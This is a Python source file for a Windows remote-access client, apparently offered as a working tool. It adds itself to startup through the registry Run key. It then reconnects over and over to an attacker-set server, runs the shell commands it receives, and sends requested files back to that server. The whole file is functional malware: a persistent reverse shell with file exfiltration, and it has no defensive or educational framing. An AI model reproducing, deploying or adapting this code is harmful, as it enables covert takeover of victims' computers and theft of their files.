# client.py
import os
import socket
import subprocess
import shutil
import sys
import time
import winreg

SERVER_IP = 'XXXXXX'  # Replace with the actual server IP (public IP or DDNS hostname)
SERVER_PORT = 8080
CHUNK_SIZE = 8192  # 8 KB chunk size for file transfer

def persist():
    """
    Copy the script to the user's Documents folder and set it to run at startup.
    """
    target_path = os.path.join(os.environ['USERPROFILE'], 'Documents', 'client.py')
    if not os.path.exists(target_path):
        shutil.copy(sys.argv[0], target_path)  # Copy itself to Documents folder
    
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registry_key, "ClientScript", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(registry_key)
    except Exception as e:
        print(f"Failed to set registry key: {e}")

def connect_to_server():
    """
    Attempt to connect to the server in an infinite loop, handling commands and file transfers.
    The client will act as a reverse shell and constantly reconnect to the server.
    """
    current_dir = os.getcwd()

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))  # Try to connect to the server
            print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
            
            while True:
                command = client_socket.recv(1024).decode()

                if command.lower() == 'exit':
                    break
                elif command.startswith("download"):
                    _, file_path = command.split(maxsplit=1)
                    file_size = os.path.getsize(file_path)
                    client_socket.send(f"SIZE {file_size}".encode())
                    
                    try:
                        with open(file_path, 'rb') as file:
                            while chunk := file.read(CHUNK_SIZE):
                                client_socket.send(chunk)
                    except FileNotFoundError:
                        client_socket.send(b"File not found.")
                elif command.startswith("upload"):
                    _, file_path = command.split(maxsplit=1)
                    try:
                        with open(file_path, 'rb') as file:
                            while chunk := file.read(CHUNK_SIZE):
                                client_socket.send(chunk)
                        client_socket.send(b"Upload complete.")  # Signal upload completion
                    except FileNotFoundError:
                        client_socket.send(b"File not found.")
                elif command.startswith("cd"):
                    try:
                        _, path = command.split(maxsplit=1)
                        new_dir = os.path.abspath(os.path.join(current_dir, path)) if path != ".." else os.path.dirname(current_dir)
                        os.chdir(new_dir)
                        current_dir = os.getcwd()
                        client_socket.send(f"Directory changed to {current_dir}".encode())
                    except Exception as e:
                        client_socket.send(f"Failed to change directory: {str(e)}".encode())
                else:
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=current_dir)
                        client_socket.send(output)
                    except subprocess.CalledProcessError as e:
                        client_socket.send(f"Command error: {str(e)}".encode())
            
            client_socket.close()
            time.sleep(5)  # Wait for a moment before trying to reconnect
            
        except Exception as e:
            print(f"Failed to connect to server: {e}")
            time.sleep(5)  # Retry after a delay

if __name__ == "__main__":
    persist()
    connect_to_server()
